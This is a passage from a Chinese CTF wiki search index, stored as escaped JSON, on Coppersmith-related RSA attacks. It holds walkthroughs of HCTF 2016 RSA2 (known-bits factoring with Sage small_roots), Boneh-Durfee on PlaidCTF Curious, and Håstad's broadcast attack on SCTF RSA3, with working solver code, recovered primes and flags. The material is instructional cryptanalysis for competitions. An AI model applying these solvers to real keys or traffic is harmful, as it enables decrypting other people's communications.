\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5206\u6790\u4e3b\u7a0b\u5e8f\u3002\u53ef\u4ee5\u770b\u51fa p , q , e = gen_key () n = p * q phi_n = ( p - 1 ) * ( q - 1 ) d = invmod ( e , phi_n ) while True : e2 = random . randint ( 0x1000 , 0x10000 ) if gcd ( e2 , phi_n ) == 1 : break \u6211\u4eec\u5f97\u5230\u7684 n=p \\times q n=p \\times q \u3002\u800c p\uff0cq \u4ee5\u53ca\u6211\u4eec\u5df2\u77e5\u7684 e \u90fd\u5728 gen_key \u51fd\u6570\u4e2d\u751f\u6210\u3002\u770b\u4e00\u770b gen_key \u51fd\u6570 def gen_key (): while True : p = getPrime ( k / 2 ) if gcd ( e , p - 1 ) == 1 : break q_t = getPrime ( k / 2 ) n_t = p * q_t t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) u = pi_b ( p4 , 1 ) n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u5176\u4e2d\u6211\u4eec\u5df2\u77e5\u5982\u4e0b\u53c2\u6570 k=2048 e=0x10001 k=2048 e=0x10001 \u9996\u5148\uff0c\u7a0b\u5e8f\u5148\u5f97\u5230\u4e86 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 p\uff0c\u5e76\u4e14 gcd(2,p-1)=1 \u3002 \u7136\u540e\uff0c\u7a0b\u5e8f\u53c8\u5f97\u5230\u4e86\u4e00\u4e2a 1024 \u6bd4\u7279\u4f4d\u7684\u7d20\u6570 q_t q_t \uff0c\u5e76\u4e14\u8ba1\u7b97 n_t=p \\times q_t n_t=p \\times q_t \u3002 \u4e0b\u9762\u591a\u6b21\u8c03\u7528\u4e86 get_bit \u51fd\u6570\uff0c\u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b def get_bit ( number , n_bit , dire ): ''' dire: 1: left 0: right ''' if dire : sn = size ( number ) if sn % 8 != 0 : sn += ( 8 - sn % 8 ) return number >> ( sn - n_bit ) else : return number & ( pow ( 2 , n_bit ) - 1 ) \u53ef\u4ee5\u770b\u51fa\u6839\u636e dire(ction) \u7684\u4e0d\u540c\uff0c\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u6570 dire=1 \u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u8ba1\u7b97 number \u7684\u4e8c\u8fdb\u5236\u4f4d\u6570 sn \uff0c\u5982\u679c\u4e0d\u662f 8 \u7684\u6574\u6570\u500d\u7684\u8bdd\uff0c\u5c31\u5c06 sn \u589e\u5927\u4e3a 8 \u7684\u6574\u6570\u500d\uff0c\u7136\u540e\u8fd4\u56de number \u53f3\u79fb sn-n_bit \u7684\u6570\u5b57\u3002\u5176\u5b9e \u5c31\u662f\u6700\u591a\u4fdd\u7559 number \u7684 n_bit \u4f4d\u3002 dire=0 \u65f6\uff0c\u7a0b\u5e8f\u76f4\u63a5\u83b7\u53d6 number \u7684\u4f4e n_bit \u4f4d\u3002 \u7136\u540e\u6211\u4eec\u518d\u6765\u770b\u7a0b\u5e8f t = get_bit ( n_t , k / 16 , 1 ) y = get_bit ( n_t , 5 * k / 8 , 0 ) p4 = get_bit ( p , 5 * k / 16 , 1 ) \u8fd9\u4e09\u4e2a\u64cd\u4f5c\u5206\u522b\u505a\u4e86\u5982\u4e0b\u7684\u4e8b\u60c5 t \u4e3a n_t \u7684\u6700\u591a\u9ad8 k/16 \u4f4d\uff0c\u5373 128 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 y \u4e3a n_t \u7684\u4f4e 5*k/8 \u4f4d\uff0c\u5373 1280 \u4f4d\uff0c\u4f4d\u6570\u56fa\u5b9a\u3002 p4 \u4e3a p \u7684\u6700\u591a\u9ad8 5*k/16 \u4f4d\uff0c\u5373 640 \u4f4d\uff0c\u4f4d\u6570\u4e0d\u56fa\u5b9a\u3002 \u6b64\u540e\uff0c\u7a0b\u5e8f\u6709\u5982\u4e0b\u64cd\u4f5c u = pi_b ( p4 , 1 ) \u5229\u7528 pi_b \u5bf9 p4 \u8fdb\u884c\u4e86\u52a0\u5bc6 def pi_b ( x , m ): ''' m: 1: encrypt 0: decrypt ''' enc = DES . new ( key ) if m : method = enc . encrypt else : method = enc . decrypt s = long_to_bytes ( x ) sp = [ s [ a : a + 8 ] for a in xrange ( 0 , len ( s ), 8 )] r = \"\" for a in sp : r += method ( a ) return bytes_to_long ( r ) \u5176\u4e2d\uff0c\u6211\u4eec\u5df2\u77e5\u4e86\u5bc6\u94a5 key\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u6709\u5bc6\u6587\u5c31\u53ef\u4ee5\u89e3\u5bc6\u3002\u6b64\u5916\uff0c\u53ef\u4ee5\u770b\u5230\u7684\u662f\u7a0b\u5e8f\u662f\u5bf9\u4f20\u5165\u7684\u6d88\u606f\u8fdb\u884c 8 \u5b57\u8282\u5206\u7ec4\uff0c\u91c7\u7528\u5bc6\u7801\u672c\u65b9\u5f0f\u52a0\u5bc6\uff0c\u6240\u4ee5\u5bc6\u6587\u4e4b\u95f4\u4e92\u4e0d\u5f71\u54cd\u3002 \u4e0b\u9762 n = bytes_to_long ( long_to_bytes ( t ) + long_to_bytes ( u ) + long_to_bytes ( y )) q = n / p if q % 2 == 0 : q += 1 while True : if isPrime ( q ) and gcd ( e , q - 1 ) == 1 : break m = getPrime ( k / 16 ) + 1 q ^= m return ( p , q , e ) \u7a0b\u5e8f\u5c06 t\uff0cu\uff0cy \u62fc\u63a5\u5728\u4e00\u8d77\u5f97\u5230 n\uff0c\u8fdb\u800c\uff0c\u7a0b\u5e8f\u5f97\u5230\u4e86 q\uff0c\u5e76\u5bf9 q \u7684\u4f4e k/16 \u4f4d\u505a\u4e86\u6291\u6216\uff0c\u7136\u540e\u8fd4\u56de q' \u3002 \u5728\u4e3b\u7a0b\u5e8f\u91cc\uff0c\u518d\u4e00\u6b21\u5f97\u5230\u4e86 n'=p*q' \u3002\u8fd9\u91cc\u6211\u4eec\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b n'=p * ( q + random(2^{k/16})) \u800c p \u662f k/2 \u4f4d\u7684\uff0c\u6240\u4ee5\u8bf4\uff0crandom \u7684\u90e8\u5206\u6700\u591a\u53ef\u4ee5\u5f71\u54cd\u539f\u6765\u7684 n \u7684\u6700\u4f4e\u7684 k/2+k/16=9k/16 k/2+k/16=9k/16 \u6bd4\u7279\u4f4d\u3002 \u800c\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 n \u7684\u6700\u4f4e\u7684 5k/8=10k/16 \u6bd4\u7279\u4e3a\u5176\u5b9e\u5c31\u662f y\uff0c\u6240\u4ee5\u5176\u5e76\u6ca1\u6709\u5f71\u54cd\u5230 u\uff0c\u5373\u4f7f\u5f71\u54cd\u5230\u4e5f\u5c31\u6700\u591a\u5f71\u54cd\u5230\u4e00\u4f4d\u3002 \u6240\u4ee5\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5229\u7528\u6211\u4eec\u5f97\u5230\u7684 n \u6765\u83b7\u53d6 u\uff0c\u5982\u4e0b u=hex(n)[2:-1][-480:-320] \u867d\u7136\uff0c\u8fd9\u6837\u53ef\u80fd\u4f1a\u83b7\u5f97\u8f83\u591a\u4f4d\u6570\u7684 u\uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5bf9 u \u89e3\u5bc6\u7684\u65f6\u5019\u6bcf\u4e00\u5206\u7ec4\u90fd\u4e92\u4e0d\u5f71\u54cd\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u53ef\u80fd\u5f71\u54cd\u6700\u9ad8\u4f4d\u6570\u7684 p4\u3002\u800c p4 \u7684\u7684\u9ad8 8 \u4f4d\u4e5f\u6709\u53ef\u80fd\u662f\u586b\u5145\u7684\u3002\u4f46\u8fd9\u4e5f\u5e76\u4e0d\u5f71\u54cd\uff0c\u6211\u4eec\u5df2\u7ecf\u5f97\u5230\u4e86\u56e0\u5b50 p \u7684\u7684\u5f88\u591a\u90e8\u5206\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u53bb\u5c1d\u8bd5\u7740\u89e3\u5bc6\u4e86\u3002\u5982\u4e0b if __name__ == \"__main__\" : n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f u = hex ( n )[ 2 : - 1 ][ - 480 : - 320 ] u = int ( u , 16 ) p4 = pi_b ( u , 0 ) print hex ( p4 ) \u89e3\u5bc6\u7ed3\u679c\u5982\u4e0b \u279c 2016 - HCTF - RSA2 git :( master ) \u2717 python exp_p4 . py 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 L \u4e0b\u9762\uff0c\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 sage \u6765\u89e3\u5bc6\uff0c\u8fd9\u91cc sage \u91cc\u9762\u5df2\u7ecf\u5b9e\u73b0\u4e86\u8fd9\u4e2a\u653b\u51fb\uff0c\u6211\u4eec\u76f4\u63a5\u62ff\u6765\u7528\u5c31\u597d from sage.all import * import binascii n = 0x724d41149e1bd9d2aa9b333d467f2dfa399049a5d0b4ee770c9d4883123be11a52ff1bd382ad37d0ff8d58c8224529ca21c86e8a97799a31ddebd246aeeaf0788099b9c9c718713561329a8e529dfeae993036921f036caa4bdba94843e0a2e1254c626abe54dc3129e2f6e6e73bbbd05e7c6c6e9f44fcd0a496f38218ab9d52bf1f266004180b6f5b9bee7988c4fe5ab85b664280c3cfe6b80ae67ed8ba37825758b24feb689ff247ee699ebcc4232b4495782596cd3f29a8ca9e0c2d86ea69372944d027a0f485cea42b74dfd74ec06f93b997a111c7e18017523baf0f57ae28126c8824bd962052623eb565cee0ceee97a35fd8815d2c5c97ab9653c4553f p4 = 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde1362693 cipher = 0xf11e932fa420790ca3976468dc4df1e6b20519ebfdc427c09e06940e1ef0ca566d41714dc1545ddbdcae626eb51c7fa52608384a36a2a021960d71023b5d0f63e6b38b46ac945ddafea42f01d24cc33ce16825df7aa61395d13617ae619dca2df15b5963c77d6ededf2fe06fd36ae8c5ce0e3c21d72f2d7f20cd9a8696fbb628df29299a6b836c418cbfe91e2b5be74bdfdb4efdd1b33f57ebb72c5246d5dce635529f1f69634d565a631e950d4a34a02281cbed177b5a624932c2bc02f0c8fd9afd332ccf93af5048f02b8bd72213d6a52930b0faa0926973883136d8530b8acf732aede8bb71cb187691ebd93a0ea8aeec7f82d0b8b74bcf010c8a38a1fa8 e2 = 0xf93b pbits = 1024 kbits = pbits - p4 . nbits () print p4 . nbits () p4 = p4 << kbits PR .< x > = PolynomialRing ( Zmod ( n )) f = x + p4 roots = f . small_roots ( X = 2 ^ kbits , beta = 0.4 ) if roots : p = p4 + int ( roots [ 0 ]) print \"p: \" , hex ( int ( p )) assert n % p == 0 q = n / int ( p ) print \"q: \" , hex ( int ( q )) print gcd ( p , q ) phin = ( p - 1 ) * ( q - 1 ) print gcd ( e2 , phin ) d = inverse_mod ( e2 , phin ) flag = pow ( cipher , d , n ) flag = hex ( int ( flag ))[ 2 : - 1 ] print binascii . unhexlify ( flag ) \u5173\u4e8e small_roots \u7684\u4f7f\u7528\uff0c\u53ef\u4ee5\u53c2\u8003 SAGE \u8bf4\u660e \u3002 \u7ed3\u679c\u5982\u4e0b \u279c 2016 -HCTF-RSA2 git: ( master ) \u2717 sage payload.sage sys:1: RuntimeWarning: not adding directory '' to sys.path since everybody can write to it. Untrusted users could put files in this directory which might then be imported by your Python code. As a general precaution from similar exploits, you should not execute Python code from this directory 640 p: 0xa37302107c17fb4ef5c3443f4ef9e220ac659670077b9aa9ff7381d11073affe9183e88acae0ab61fb75a3c7815ffcb1b756b27c4d90b2e0ada753fa17cc108c1d0de82c747db81b9e6f49bde13626933aa6762057e1df53d27356ee6a09b17ef4f4986d862e3bb24f99446a0ab2385228295f4b776c1f391ab2a0d8c0dec1e5L q: 0xb306030a7c6ace771db8adb45fae597f3c1be739d79fd39dfa6fd7f8c177e99eb29f0462c3f023e0530b545df6e656dadb984953c265b26f860b68aa6d304fa403b0b0e37183008592ec2a333c431e2906c9859d7cbc4386ef4c4407ead946d855ecd6a8b2067ad8a99b21111b26905fcf0d53a1b893547b46c3142b06061853L 1 1 hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 } \u9898\u76ee \u00b6 2016 \u6e56\u6e58\u676f \u7b80\u5355\u7684 RSA 2017 WHCTF Untitled Boneh and Durfee attack \u00b6 \u653b\u51fb\u6761\u4ef6 \u00b6 \u5f53 d \u8f83\u5c0f\u65f6\uff0c\u6ee1\u8db3 d\\leq N^{0.292} d\\leq N^{0.292} \u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8be5\u5de5\u5177\uff0c\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u8be5\u8981\u653b\u51fb\u6bd4 Wiener's Attack \u8981\u5f3a\u4e00\u4e9b\u3002 \u653b\u51fb\u539f\u7406 \u00b6 \u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u539f\u7406 \u9996\u5148\u6211\u4eec\u6709 ed \\equiv 1 \\bmod \\varphi(N) ed \\equiv 1 \\bmod \\varphi(N) \u8fdb\u800c\u6211\u4eec\u6709 ed =k\\varphi(N)+1 ed =k\\varphi(N)+1 \u5373 k \\varphi(N) +1 \\equiv 0 \\bmod e k \\varphi(N) +1 \\equiv 0 \\bmod e \u53c8 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \\varphi(N)=(p-1)(q-1)=qp-p-q+1=N-p-q+1 \u6240\u4ee5 k(N-p-q+1)+1 \\equiv 0 \\bmod e k(N-p-q+1)+1 \\equiv 0 \\bmod e \u6211\u4eec\u5047\u8bbe A=N+1 A=N+1 \uff0c y=-p-q y=-p-q \u90a3\u4e48 \u539f\u5f0f\u53ef\u5316\u4e3a f(k,y)=k(A+y)+1 \\equiv 0 \\bmod e f(k,y)=k(A+y)+1 \\equiv 0 \\bmod e \u5982\u679c\u6211\u4eec\u6c42\u5f97\u4e86\u8be5\u4e8c\u5143\u65b9\u7a0b\u7684\u6839\uff0c\u90a3\u4e48\u6211\u4eec\u81ea\u7136\u4e5f\u5c31\u53ef\u4ee5\u89e3\u4e00\u5143\u4e8c\u6b21\u65b9\u7a0b N=pq,p+q=-y N=pq,p+q=-y \u6765\u5f97\u5230 p \u4e0e q\u3002 \u653b\u51fb\u5de5\u5177 \u00b6 \u8bf7\u53c2\u8003 https://github.com/mimoo/RSA-and-LLL-attacks \u3002\u4e0a\u9762\u6709\u4f7f\u7528\u6559\u7a0b\u3002 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 PlaidCTF-CTF-Curious \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u5806 N\uff0ce\uff0cc\u3002\u7b80\u5355\u770b\u4e00\u4e0b\u53ef\u4ee5\u53d1\u73b0\u8be5 e \u6bd4\u8f83\u5927\u3002\u8fd9\u65f6\u5019\u6211\u4eec\u53ef\u4ee5\u8003\u8651\u4f7f\u7528 Wiener's Attack\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u66f4\u5f3a\u7684\u76ee\u524d\u4ecb\u7ecd\u7684\u653b\u51fb\u3002 \u6838\u5fc3\u4ee3\u7801\u5982\u4e0b nlist = list () elist = list () clist = list () with open ( 'captured' ) as f : # read the line {N : e : c} and do nothing with it f . readline () for i in f . readlines (): ( N , e , c ) = i [ 1 : - 2 ] . split ( \" : \" ) nlist . append ( long ( N , 16 )) elist . append ( long ( e , 16 )) clist . append ( long ( c , 16 )) for i in range ( len ( nlist )): print 'index i' n = nlist [ i ] e = elist [ i ] c = clist [ i ] d = solve ( n , e ) if d == 0 : continue else : m = power_mod ( c , d , n ) hex_string = \" %x \" % m import binascii print \"the plaintext:\" , binascii . unhexlify ( hex_string ) return \u7ed3\u679c\u5982\u4e0b === solution found === private key found: 23974584842546960047080386914966001070087596246662608796022581200084145416583 the plaintext: flag_S0Y0UKN0WW13N3R $4 TT4CK! \u53c2\u8003\u8d44\u6599 \u00b6 Survey: Lattice Reduction Attacks on RSA An Introduction to Coppersmith\u2019s method and Applications in Cryptology","title":"Coppersmith \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#coppersmith","text":"","title":"Coppersmith \u76f8\u5173\u653b\u51fb"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_1","text":"Coppersmith \u76f8\u5173\u653b\u51fb\u4e0e Don Coppersmith \u7d27\u5bc6\u76f8\u5173\uff0c\u4ed6\u63d0\u51fa\u4e86\u4e00\u79cd\u9488\u5bf9\u4e8e\u6a21\u591a\u9879\u5f0f\uff08\u5355\u53d8\u91cf\uff0c\u4e8c\u5143\u53d8\u91cf\uff0c\u751a\u81f3\u591a\u5143\u53d8\u91cf\uff09\u627e\u6240\u6709\u5c0f\u6574\u6570\u6839\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7684\u65b9\u6cd5\u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5\u5355\u53d8\u91cf\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u5047\u8bbe \u6a21\u6570\u4e3a N \uff0cN \u5177\u6709\u4e00\u4e2a\u56e0\u5b50 b\\geq N^{\\beta},1< \\beta \\leq1 b\\geq N^{\\beta},1< \\beta \\leq1 \u591a\u9879\u5f0f F \u7684\u6b21\u6570\u4e3a \\delta \\delta \u90a3\u4e48\u8be5\u65b9\u6cd5\u53ef\u4ee5\u5728 O(c\\delta^5log^9(N)) O(c\\delta^5log^9(N)) \u7684\u590d\u6742\u5ea6\u5185\u627e\u5230\u8be5\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839 x_0 x_0 \uff0c\u8fd9\u91cc\u6211\u4eec\u8981\u6c42 |x_0|<cN^{\\frac{\\beta^2}{\\delta}} |x_0|<cN^{\\frac{\\beta^2}{\\delta}} \u3002 \u5728\u8fd9\u4e2a\u95ee\u9898\u4e2d\uff0c\u6211\u4eec\u7684\u76ee\u6807\u662f\u627e\u5230\u5728\u6a21 N \u610f\u4e49\u4e0b\u591a\u9879\u5f0f\u6240\u6709\u7684\u6839\uff0c\u8fd9\u4e00\u95ee\u9898\u88ab\u8ba4\u4e3a\u662f\u590d\u6742\u7684\u3002 Coppersmith method \u4e3b\u8981\u662f\u901a\u8fc7 Lenstra\u2013Lenstra\u2013Lov\u00e1sz lattice basis reduction algorithm \uff08LLL\uff09\u65b9\u6cd5\u627e\u5230 \u4e0e\u8be5\u591a\u9879\u5f0f\u5177\u6709\u76f8\u540c\u6839 x_0 x_0 \u66f4\u5c0f\u7cfb\u6570 \u5b9a\u4e49\u57df\u4e3a\u6574\u6570\u57df \u7684\u591a\u9879\u5f0f g\uff0c\u7531\u4e8e\u5728\u6574\u6570\u57df\u4e0a\u627e\u591a\u9879\u5f0f\u7684\u6839\u662f\u7b80\u5355\u7684\uff08Berlekamp\u2013Zassenhaus\uff09\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u5f97\u5230\u4e86\u539f\u591a\u9879\u5f0f\u5728\u6a21\u610f\u4e49\u4e0b\u7684\u6574\u6570\u6839\u3002 \u90a3\u4e48\u95ee\u9898\u7684\u5173\u952e\u5c31\u662f\u5982\u4f55\u5c06 f \u8f6c\u6362\u5230 g \u5462\uff1fHowgrave-Graham \u7ed9\u51fa\u4e86\u4e00\u79cd\u601d\u8def \u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u9700\u8981\u627e\u5230\u4e00\u4e2a\u5177\u6709\u201c\u66f4\u5c0f\u7cfb\u6570\u201d\u7684\u591a\u9879\u5f0f g\uff0c\u4e5f\u5c31\u662f\u4e0b\u9762\u7684\u8f6c\u6362\u65b9\u5f0f \u5728 LLL \u7b97\u6cd5\u4e2d\uff0c\u6709\u4e24\u70b9\u662f\u975e\u5e38\u6709\u7528\u7684 \u53ea\u5bf9\u539f\u6765\u7684\u57fa\u5411\u91cf\u8fdb\u884c\u6574\u6570\u7ebf\u6027\u53d8\u6362\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5728\u5f97\u5230 g \u65f6\uff0c\u4ecd\u7136\u4ee5\u539f\u6765\u7684 x_0 x_0 \u4e3a\u6839\u3002 \u751f\u6210\u7684\u65b0\u7684\u57fa\u5411\u91cf\u7684\u6a21\u957f\u662f\u6709\u754c\u7684\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u5229\u7528 Howgrave-Graham \u5b9a\u7406\u3002 \u5728\u8fd9\u6837\u7684\u57fa\u7840\u4e4b\u4e0a\uff0c\u6211\u4eec\u518d\u6784\u9020\u51fa\u591a\u9879\u5f0f\u65cf g \u5c31\u53ef\u4ee5\u4e86\u3002 \u5173\u4e8e\u66f4\u52a0\u7ec6\u8282\u7684\u5185\u5bb9\uff0c\u8bf7\u81ea\u884c\u641c\u7d22\u3002\u540c\u65f6\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4f1a\u4e0d\u65ad\u66f4\u65b0\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e Coppersmith \u6839\u7684\u7ea6\u675f\uff0c\u5728 RSA \u4e2d\u7684\u5e94\u7528\u65f6\uff0c\u5f80\u5f80\u53ea\u9002\u7528\u4e8e e \u8f83\u5c0f\u7684\u60c5\u51b5\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#basic-broadcast-attack","text":"","title":"Basic Broadcast Attack"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_2","text":"\u5982\u679c\u4e00\u4e2a\u7528\u6237\u4f7f\u7528\u540c\u4e00\u4e2a\u52a0\u5bc6\u6307\u6570 e \u52a0\u5bc6\u4e86\u540c\u4e00\u4e2a\u5bc6\u6587\uff0c\u5e76\u53d1\u9001\u7ed9\u4e86\u5176\u4ed6 e \u4e2a\u7528\u6237\u3002\u90a3\u4e48\u5c31\u4f1a\u4ea7\u751f\u5e7f\u64ad\u653b\u51fb\u3002\u8fd9\u4e00\u653b\u51fb\u7531 H\u00e5stad \u63d0\u51fa\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_3","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe e \u4e3a 3\uff0c\u5e76\u4e14\u52a0\u5bc6\u8005\u4f7f\u7528\u4e86\u4e09\u4e2a\u4e0d\u540c\u7684\u6a21\u6570 n_1,n_2,n_3 n_1,n_2,n_3 \u7ed9\u4e09\u4e2a\u4e0d\u540c\u7684\u7528\u6237\u53d1\u9001\u4e86\u52a0\u5bc6\u540e\u7684\u6d88\u606f m\uff0c\u5982\u4e0b \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \\begin{align*} c_1&=m^3\\bmod n_1 \\\\ c_2&=m^3\\bmod n_2 \\\\ c_3&=m^3\\bmod n_3 \\end{align*} \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe n_1,n_2,n_3\u200b n_1,n_2,n_3\u200b \u4e92\u7d20\uff0c\u4e0d\u7136\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u89e3\uff0c\u7136\u540e\u5f97\u5230 d\uff0c\u8fdb\u800c\u7136\u540e\u76f4\u63a5\u89e3\u5bc6\u3002 \u540c\u65f6\uff0c\u6211\u4eec\u5047\u8bbe m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \u3002\u5982\u679c\u8fd9\u4e2a\u6761\u4ef6\u4e0d\u6ee1\u8db3\u7684\u8bdd\uff0c\u5c31\u4f1a\u4f7f\u5f97\u60c5\u51b5\u53d8\u5f97\u6bd4\u8f83\u590d\u6742\uff0c\u8fd9\u91cc\u6211\u4eec\u6682\u4e0d\u8ba8\u8bba\u3002 \u65e2\u7136\u4ed6\u4eec\u4e92\u7d20\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\uff0c\u53ef\u5f97 m^3 \\equiv C \\bmod n_1n_2n_3 m^3 \\equiv C \\bmod n_1n_2n_3 \u3002 \u6b64\u5916\uff0c\u65e2\u7136 m<n_i, 1\\leq i \\leq 3 m<n_i, 1\\leq i \\leq 3 \uff0c\u90a3\u4e48\u6211\u4eec\u77e5\u9053 m^3 < n_1n_2n_3 m^3 < n_1n_2n_3 \u5e76\u4e14 C<m^3 < n_1n_2n_3 C<m^3 < n_1n_2n_3 \uff0c\u90a3\u4e48 m^3 = C m^3 = C \uff0c\u6211\u4eec\u5bf9 C \u5f00\u4e09\u6b21\u6839\u5373\u53ef\u5f97\u5230 m \u7684\u503c\u3002 \u5bf9\u4e8e\u8f83\u5927\u7684 e \u6765\u8bf4\uff0c\u6211\u4eec\u53ea\u662f\u9700\u8981\u66f4\u591a\u7684\u660e\u5bc6\u6587\u5bf9\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#sctf-rsa3-level4","text":"\u53c2\u8003 http://ohroot.com/2016/07/11/rsa-in-ctf \u3002 \u8fd9\u91cc\u6211\u4eec\u4ee5 SCTF RSA3 \u4e2d\u7684 level4 \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9996\u5148\u7f16\u5199\u4ee3\u7801\u63d0\u53d6 cap \u5305\u4e2d\u7684\u6570\u636e\uff0c\u5982\u4e0b #!/usr/bin/env python from scapy.all import * import zlib import struct PA = 24 packets = rdpcap ( './syc_security_system_traffic3.pcap' ) client = '192.168.1.180' list_n = [] list_m = [] list_id = [] data = [] for packet in packets: # TCP Flag PA 24 means carry data if packet [ TCP ] .flags == PA or packet [ TCP ] .flags == PA + 1 : src = packet [ IP ] .src raw_data = packet [ TCP ] .load head = raw_data.strip ()[ :7 ] if head == \"We have\" : n, e = raw_data.strip () .replace ( \"We have got N is \" , \"\" ) .split ( '\\ne is ' ) data.append ( n.strip ()) if head == \"encrypt\" : m = raw_data.replace ( 'encrypted messages is 0x' , '' ) .strip () data.append ( str ( int ( m, 16 ))) with open ( './data.txt' , 'w' ) as f: for i in range ( 0 , len ( data ) , 2 ) : tmp = ',' .join ( s for s in data [ i:i + 2 ]) f.write ( tmp + '\\n' ) \u5176\u6b21\uff0c\u5229\u7528\u5f97\u5230\u7684\u6570\u636e\u76f4\u63a5\u4f7f\u7528\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406\u6c42\u89e3\u3002 from functools import reduce import gmpy import json , binascii def modinv ( a , m ): return int ( gmpy . invert ( gmpy . mpz ( a ), gmpy . mpz ( m ))) def chinese_remainder ( n , a ): sum = 0 prod = reduce ( lambda a , b : a * b , n ) # \u5e76\u884c\u8fd0\u7b97 for n_i , a_i in zip ( n , a ): p = prod // n_i sum += a_i * modinv ( p , n_i ) * p return int ( sum % prod ) nset = [] cset = [] with open ( \"data.txt\" ) as f : now = f . read () . strip ( ' \\n ' ) . split ( ' \\n ' ) for item in now : item = item . split ( ',' ) nset . append ( int ( item [ 0 ])) cset . append ( int ( item [ 1 ])) m = chinese_remainder ( nset , cset ) m = int ( gmpy . mpz ( m ) . root ( 19 )[ 0 ]) print binascii . unhexlify ( hex ( m )[ 2 : - 1 ]) \u5f97\u5230\u5bc6\u6587\uff0c\u7136\u540e\u518d\u6b21\u89e3\u5bc6\u5373\u53ef\u5f97\u5230 flag\u3002 H1sTaDs_B40aDcadt_attaCk_e_are_same_and_smA9l","title":"SCTF RSA3 LEVEL4"},{"location":"crypto/asymmetric/rsa/rsa_coppersmith_attack/#_4","text":"2017 WHCTF OldDriver 2018 N1CTF 